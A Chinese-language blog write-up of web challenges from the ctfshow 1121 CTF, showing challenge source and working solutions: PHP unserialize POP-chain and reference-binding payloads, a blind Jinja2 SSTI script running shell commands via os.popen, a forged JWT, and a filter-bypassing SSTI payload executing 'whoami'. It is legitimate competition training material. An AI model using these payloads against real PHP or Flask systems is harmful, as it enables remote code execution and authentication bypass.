---
title: "CTFshow1121击剑杯 Wp"
slug: "ctfshow-1121-jjcup-wp"
description: "只有web，还少一道，摆了"
date: 2021-11-16T03:00:57+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## 给我看看

```php
<?php
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
require_once("flag.php");

class whoami{
    public $name;
    public $your_answer;
    public $useless;

    public function __construct(){
        $this->name='ctfshow第一深情';
        $this->your_answer='Only you know';
        $this->useless="I_love_u";
    }

    public function __wakeup(){
        global $flag;
        global $you_never_know;
        $this->name=$you_never_know;

        if($this->your_answer === $this->name){
            echo $flag;
        }
    }
}

$secret = $_GET['s'];
if(isset($secret)){
    if($secret==="给我看看!"){
        extract($_POST);
        if($secret==="给我看看!"){
            die("<script>window.alert('这是不能说的秘密');location.href='https://www.bilibili.com/video/BV1CW411g7UF';</script>");
        }
        unserialize($secret);
    }
}else{
    show_source(__FILE__);
}
```

是几个小trick的合集，不难

- `extract()`可以变量覆盖
- `$this->your_answer === $this->name`这样的强比较可以用指针取地址方式绕过

exp

```
$test = new whoami();
$test->your_answer=&$test->name;
echo serialize($test);
```

payload

```
/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21
POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D
```

![image-20211111233756111](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111233756111.png)

## 谁是ctf之王？

> 据说输入框能连起来的

f12可以看到提示/ssti.html

然后没啥可说的，原题，一点都没改，直接看之前的博客->[[DigitalOverdoseCTF 2021]madlib](https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib)

![image-20211111235757667](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111235757667.png)

yysy，看到这个hint我就已经意识到是在考这个题了，果然，没拿上一血可惜了

## easypop

```php
<?php
highlight_file (__FILE__);
error_reporting(0);
class action_1{
    public $tmp;
    public $fun = 'system';
    public function __call($wo,$jia){
        call_user_func($this->fun);
    }
    public function __wakeup(){
        $this->fun = '';
        die("阿祖收手吧，外面有套神");
    }
    public function __toString(){
        return $this->tmp->str;
    }
}

class action_2{
    public $p;
    public $tmp;
    public function getFlag(){
        if (isset($_GET['ctfshow'])) {
            $this->tmp = $_GET['ctfshow'];
        }
        system("cat /".$this->tmp);
    }
    public function __call($wo,$jia){
        phpinfo();
    }
    public function __wakeup(){
        echo "<br>";
        echo "php版本7.3哦，没有人可以再绕过我了";
        echo "<br>";
    }
    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

class action_3{
    public $str;
    public $tmp;
    public $ran;
    public function __construct($rce){
        echo "送给你了";
        system($rce);
    }
    public function __destruct(){
        urlencode($this->str);
    }
    public function __get($jia){
        if(preg_match("/action_2/",get_class($this->ran))){
            return "啥也没有";
        }
        return $this->ran->$jia();
    }
}

class action_4{
    public $ctf;
    public $show;
    public $jia;
    public function __destruct(){
        $jia = $this->jia;
        echo $this->ran->$jia;
    }
    public function append($ctf,$show){
        echo "<br>";
        echo new $ctf($show);
    }
    public function __invoke(){
        $this->append($this->ctf,$this->show);
    }
}
if(isset($_GET['pop'])){
    $pop = $_GET['pop'];
    $output = unserialize($pop);
    if(preg_match("/php/",$output)){
            echo "套神黑进这里并给你了一个提示：文件名是f开头的形如fA6_形式的文件";
            die("不可以用伪协议哦");
        }
}
```

先直接放payload把，直接用的action_3的rce

```php
<?php
class action_4{
    public function __construct(){
        $this->ctf = 'action_3';
        $this->show = 'cat /fz3_.txt';
    }
}

class action_2{
    public function __construct(){
        $this->p = new action_4();
    }
}

class action_1{
    public function __construct(){
        $this->tmp = new action_2();
    }
}

class action_3{
    public function __construct(){
        $this->str = new action_1();
    }
}

echo serialize(new action_3());
```

这个应该比较简单，不用分析都能看明白

官方wp的预期解长这样->[wp](https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#Nb2X8y)，首先用到了php的内置类DirectoryIterator配合glob伪协议爆破flag文件名

```php
<?php
class action_4 {
    public function __construct(){
        $this->ctf = "DirectoryIterator";   //GlobIterator
        $this->show ="glob:///f[A-z][0-9]_*";
    }
}

class action_3{
    public function __construct(){
        $this->str = new action_1();
    }
}
class action_1{
    public function __construct(){
        $this->tmp = new action_2();
    }
}
class action_2{
    public function __construct(){
        $this->p = new action_4();
    }
}
echo serialize(new action_3());
```

这个确实，但是之后的`call_user_func`，我只能说 有一说一 我是没复现成功

这里的死亡wakeup永远会比call先调用，func这里还没到call_user_func就先被清空了，怎么执行？？？

## 近在眼前

```python
#!/usr/bin/env python3

from flask import Flask, render_template_string, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10000 per hour"]
)


@limiter.limit("5/second", override_defaults=True)
@app.route('/')
def index():
    return ("\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e")%open(__file__).read()


@limiter.limit("5/second", override_defaults=True)
@app.route('/ssti')
def check():
    flag = open("/app/flag.txt", 'r').read().strip()
    if "input" in request.args:
        query = request.args["input"]
        render_template_string(query)
        return "Thank you for your input."
    return "No input found."


app.run('0.0.0.0', 80)
```

属于是char-by-char类型盲注和ssti的结合，限制了1秒5次请求，所以需要我们特意限制一下

```python
import requests

_url = 'http://9a5415f7-b712-423d-b7d4-7f2d61665f95.challenge.ctf.show/ssti?input='
_payload_1 = "{%25 set flag=config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()%25}{%25 set sleep=config.__class__.__init__.__globals__['os'].popen('sleep 2.5')%25}{%25if '"
_payload_2 = "' in flag%25}{{sleep.read()}}{%25endif%25}"
r = requests.session()

charset = 'abcdefghijklmnopqrstuvwxyz0123456789-_{}'
data = ''
content = 'ctfshow{'

for _ in range(40):
    for i in charset:
        data = content + i
        # print(data)
        url = _url + _payload_1 + data + _payload_2
        try:
            r.get(url=url, timeout=(2.5, 2.5))
        except Exception as e:
            content = data
            print(content)
            break

print(data)
```

有小概率会崩，可以多跑一次

## 通关大佬

登录，尝试admin: admin，回显 你不能以管理员账号登录，抓包看到jwt，先用jwt.io梭一下

![image-20211115110336856](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115110336856.png)

再用c-jwt-cracker梭一下，爆出来key=12345（不过说实话我这里真没爆出来），再用jwt.io改一下user和exp

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2MzY5NTUwNjR9.jEw2QuCd67ZRC_eAVynhcZTYAyjHSxfrrpkqEF98Uio
```

![image-20211115120908659](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211115120908659.png)

看到这种的框，直觉就是sqli, xss, ssti；加上jwt一般flask会用，试一下ssti，果然

这里的通关人对长度进行了限制，排名需要是数字，时间没有啥必要改，感言不限长度，但是过滤了一票字符（单双引号（无法用hex和拼接），下划线，request，中括号，百分号（无法for语句遍历 如果用chr()还得爆破），算是比较严格的了），可以用`|attr()`这样的形式来绕过，看了wp之后发现这里还结合了`request.args`，也就是加一些get参数然后在post的部分进行引用，再充分利用config这个对象（前面那个原题也是充分用了config），payload:

```
/edit?a=__init__&b=__globals__&c=__getitem__&d=os&e=popen&f=whoami&g=read
POST: name={%25set%20r=request.args%25}&rank=1&speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&time=2021年11月11日
```

